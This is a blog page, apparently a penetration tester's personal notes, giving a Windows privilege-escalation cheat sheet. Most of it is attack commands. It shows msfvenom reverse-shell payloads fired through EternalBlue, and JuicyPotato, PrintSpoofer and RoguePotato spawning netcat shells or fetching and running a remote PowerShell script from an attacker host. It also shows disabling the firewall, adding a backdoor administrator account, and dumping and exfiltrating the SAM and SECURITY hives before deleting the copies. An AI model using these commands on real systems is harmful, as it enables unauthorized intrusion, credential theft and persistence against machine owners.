@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - PE Windows // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - PE Windows"/>
+<meta name="twitter:description" content="PE Scripts winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS https://github.com/rasta-mouse/Sherlock &gt; import-module .\Sherlock.ps1&gt; Find-AllVulns&gt; powershell -ExecutionPolicy Bypass -command &#34;&amp; { . .\Sherlock.ps1; Find-AllVulns }&#34; Enum Find writable folders &gt; dir /b /s /a:D Password search # reg pass search&gt; reg query HKLM /f pass /t REG_SZ /s# search dir&gt; dir *.dbx /s (Emails)# search passwords&gt; findstr /si password *.xml *.ini *.txt (Find passwords) Char limit: dir /x shows the directory in old notation."/>
+
+    <meta property="og:title" content="Notes - PE Windows" />
+<meta property="og:description" content="PE Scripts winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS https://github.com/rasta-mouse/Sherlock &gt; import-module .\Sherlock.ps1&gt; Find-AllVulns&gt; powershell -ExecutionPolicy Bypass -command &#34;&amp; { . .\Sherlock.ps1; Find-AllVulns }&#34; Enum Find writable folders &gt; dir /b /s /a:D Password search # reg pass search&gt; reg query HKLM /f pass /t REG_SZ /s# search dir&gt; dir *.dbx /s (Emails)# search passwords&gt; findstr /si password *.xml *.ini *.txt (Find passwords) Char limit: dir /x shows the directory in old notation." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/1b-pe-win/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-11T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-11T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - PE Windows</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 11, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="pe-scripts">PE Scripts</h1>
+<ul>
+<li>winPEAS: <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></li>
+<li><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; import-module .\Sherlock.ps1
+&gt; Find-AllVulns
+&gt; powershell -ExecutionPolicy Bypass -command &#34;&amp; { . .\Sherlock.ps1; Find-AllVulns }&#34;
+</code></pre><h1 id="enum">Enum</h1>
+<ul>
+<li>Find writable folders</li>
+</ul>
+<pre tabindex="0"><code>&gt; dir /b /s /a:D
+</code></pre><ul>
+<li>Password search</li>
+</ul>
+<pre tabindex="0"><code># reg pass search
+&gt; reg query HKLM /f pass /t REG_SZ /s
+
+# search dir
+&gt; dir *.dbx /s (Emails)
+
+# search passwords
+&gt; findstr /si password *.xml *.ini *.txt (Find passwords)
+</code></pre><ul>
+<li>Char limit: <code>dir /x</code> shows the directory in old notation. Then, get the file using the following</li>
+</ul>
+<pre tabindex="0"><code>&gt; get \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
+</code></pre><h1 id="eternalblue">EternalBlue</h1>
+<ul>
+<li>windows 7/2008/8/2012 x64, <a href="https://github.com/helviojunior/MS17-010">https://github.com/helviojunior/MS17-010</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=4444 --platform windows -a x86 -f exe -o windows_x86_shell_reverse_tcp.exe
+&gt; python send_and_execute.py &lt;ip&gt; shellcode/windows_x86_shell_reverse_tcp.exe
+</code></pre><ul>
+<li>Windows 8.1 Enterprise 9600 x64, <a href="https://www.exploit-db.com/exploits/42315">https://www.exploit-db.com/exploits/42315</a></li>
+</ul>
+<pre tabindex="0"><code># disbale firewall
+&gt; service_exec(conn, r&#39;cmd /c netsh firewall set opmode disable&#39;)
+&gt; service_exec(conn, r&#39;cmd /c net user hacker pass123 /add&#39;)
+&gt; service_exec(conn, r&#39;cmd /c net localgroup administrators hacker /add&#39;) 
+</code></pre><h1 id="folder-permissions">Folder permissions</h1>
+<pre tabindex="0"><code># check what services can be accessed by the current user
+&gt; accesschk.exe /accepteula -uwcqv &#34;Authenticated Users&#34; *
+
+# check folder permission
+&gt; icacls &#34;C:\Program Files (x86)\hide.me VPN&#34;
+</code></pre><h1 id="juicy-potato">Juicy Potato</h1>
+<ul>
+<li>x86, <a href="https://github.com/ivanitlearning/Juicy-Potato-x86">https://github.com/ivanitlearning/Juicy-Potato-x86</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; JuicyPotato.exe -l 4444 -p C:\Users\jill\Desktop\nc.exe -a &#34;&lt;ip&gt; 4444 -e cmd.exe&#34; -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+</code></pre><ul>
+<li>x64, <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a></li>
+<li><code>SeImpersonatePrivilege</code>, <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; PrintSpoofer32.exe -i -c cmd
+&gt; PrintSpoofer32.exe -c &#34;nc.exe &lt;ip&gt; 4444 -e cmd&#34;
+</code></pre><h1 id="kernel-exploits">Kernel Exploits</h1>
+<ul>
+<li>Windows Kernel exploits cheatsheet: <a href="https://kakyouim.hatenablog.com/entry/2020/05/27/010807">https://kakyouim.hatenablog.com/entry/2020/05/27/010807</a></li>
+<li>windows-kernel-exploits: <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
+</ul>
+<h1 id="patches">Patches</h1>
+<ul>
+<li>Check patches</li>
+</ul>
+<pre tabindex="0"><code>&gt; wmic qfe list
+
+# Known exploits
+KB4540673: SMBGhost, port 445, https://github.com/danigargu/CVE-2020-0796
+</code></pre><h1 id="roguepotato">RoguePotato</h1>
+<pre tabindex="0"><code>&gt; .\RoguePotato.exe -c &#34;{B91D5831-B1BD-4608-8198-D72E155020F7}&#34; -r &lt;ip&gt; -e &#34;powershell -c iex( iwr http://&lt;ip&gt;/shell.ps1 -UseBasicParsing )&#34; -l 9000
+</code></pre><h1 id="sam-offline-cracking">SAM offline cracking</h1>
+<pre tabindex="0"><code>&gt; reg save HKLM\SYSTEM system.save
+&gt; reg save HKLM\SAM sam.save
+&gt; reg save HKLM\SECURITY security.save
+&gt; get system.save
+&gt; get sam.save
+&gt; get security.save
+&gt; del /f system.save
+&gt; del /f sam.save
+&gt; del /f security.save
+</code></pre><h1 id="servicesscheduled-tasks">Services/Scheduled tasks</h1>
+<pre tabindex="0"><code># Show all services
+&gt; sc query type= service state= all
+
+# powershell
+&gt; Get-Service
+&gt; Get-ScheduledTask
+
+# Get all scheduled tasks
+&gt; schtasks
+&gt; schtasks /query /fo LIST /v 
+
+# auto start services
+&gt; wmic service get name, displayname, pathname, startmode |findstr /i &#34;auto&#34;| findstr /i /v &#34;c:\windows\\&#34; | findstr /i /v &#34;&#34;&#34;
+</code></pre><ul>
+<li>Windows Server 2008 Standard 6.0.6001 Service Pack 1 Build 6001 exploit: <a href="https://www.exploit-db.com/exploits/15589">https://www.exploit-db.com/exploits/15589</a></li>
+</ul>
+<h1 id="spoolsv">spoolsv</h1>
+<ul>
+<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
+<li><a href="https://www.exabeam.com/information-security/detecting-the-printnightmare-cve-2021-1675-34527-vulnerability-using-exabeam/">https://www.exabeam.com/information-security/detecting-the-printnightmare-cve-2021-1675-34527-vulnerability-using-exabeam/</a></li>
+<li>Impacted versions:</li>
+</ul>
+<pre tabindex="0"><code>Windows Server Version 2004
+Windows Server Version 2008
+Windows Server Version 2008R2
+Windows Server Version 2012
+Windows Server Version 2012R2
+Windows Server 2016
+Windows Server 2019
+Windows Server 20H2
+Windows 7
+Windows 8.1
+Windows 10
+</code></pre><h1 id="user-privileges">User privileges</h1>
+<ul>
+<li>Windows account privileges: <a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; whoami /priv
+</code></pre><h1 id="wsus-attack">WSUS attack</h1>
+<ul>
+<li><a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/">https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/</a></li>
+<li>SharpWSUS: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment</a></li>
+</ul>
+<h1 id="icacls-ref">icacls ref</h1>
+<ol>
+<li>A sequence of simple rights:
+F (full access)
+M (modify access)
+RX (read and execute access)
+R (read-only access)
+W (write-only access)</li>
+<li>A comma-separated list in parenthesis of specific rights:
+D (delete)
+RC (read control)
+WDAC (write DAC)
+WO (write owner)
+S (synchronize)
+AS (access system security)
+MA (maximum allowed)
+GR (generic read)
+GW (generic write)
+GE (generic execute)
+GA (generic all)
+RD (read data/list directory)
+WD (write data/add file)
+AD (append data/add subdirectory)
+REA (read extended attributes)
+WEA (write extended attributes)
+X (execute/traverse)
+DC (delete child)
+RA (read attributes)
+WA (write attributes)</li>
+<li>Inheritance rights may precede either Perm form, and they are applied only to directories:
+(OI): object inherit
+(CI): container inherit
+(IO): inherit only
+(NP): do not propagate inherit
+(I): permission inherited from parent container</li>
+</ol>
+<h1 id="portable-py3">portable py3</h1>
+<p><a href="https://winpython.github.io/">https://winpython.github.io/</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
